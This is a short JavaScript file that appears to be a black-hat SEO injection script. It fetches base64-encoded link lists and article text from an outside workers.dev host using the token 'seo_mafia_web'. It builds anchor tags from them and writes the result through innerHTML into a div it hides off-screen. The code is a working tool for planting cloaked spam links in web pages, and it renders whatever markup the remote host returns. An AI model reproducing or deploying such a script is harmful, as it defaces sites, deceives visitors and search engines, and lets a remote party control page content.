!function(){
try{

const API_BASE="https://smw-queryjs.data-deliver.workers.dev";
const TOKEN="seo_mafia_web";
function decode(b64){
 try{
   return new TextDecoder().decode(
     Uint8Array.from(atob(b64),c=>c.charCodeAt(0))
   );
 }catch(e){
   console.warn("decode error",e);
   return "";
 }
}

async function getData(id){
 try{
   const res=await fetch(API_BASE+"/data-value?id="+id+"&token="+TOKEN,{cache:"no-store"});
   if(!res.ok) return "";
   const json=await res.json();
   if(!json.payload) return "";
   return decode(json.payload);
 }catch(e){
   console.warn("fetch error",e);
   return "";
 }
}

Promise.all([
 getData("b1"),
 getData("a1")
]).then(function(res){

 let anchorsRaw=res[0];
 let articleRaw=res[1];

 console.log("RAW ANCHORS:",anchorsRaw);
 console.log("RAW ARTICLE:",articleRaw);
 
 if(!anchorsRaw || !articleRaw){
   console.warn("panel2 data kosong");
   return;
 }

 let anchors = anchorsRaw
  .split(/\r?\n/)
  .map(v => v.trim())
  .filter(Boolean)
  .map(function(line){

    line = line.replace(/\s*\|\s*/g, "|");
    let parts = line.split("|");
    if(parts.length < 2) return "";
    let text = parts[0].trim();
    let url  = parts.slice(1).join("|").trim();

    if(!text || !url || !/^https?:\/\//i.test(url)) return "";
    return '<a href="'+url+'" target="_blank">'+text+'</a>';
  })
  .filter(Boolean);
 console.log("ANCHORS RESULT:",anchors);
 if(!anchors.length){
   console.warn("panel2 anchor kosong");
   return;
 }
 let i=0;
 let html;
 if(/\{ANCHOR\}/i.test(articleRaw)){
   html=articleRaw.replace(/\{ANCHOR\s*\}/gi,function(){
     return anchors[i++%anchors.length];
   });
 }else{
   html=anchors.join(" ");
 }
 inject(html);
});
function inject(html){
 let box=document.getElementById("bunker-payload-2");
 if(!box){
   box=document.createElement("div");
   box.id="bunker-payload-2";
   box.style.cssText="position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden;font-size:0;";
   (document.body||document.documentElement).appendChild(box);
 }
 box.innerHTML=html;
 console.log("panel2 inject sukses");
}
}catch(e){
 console.error("panel2 fatal",e);
}
}();
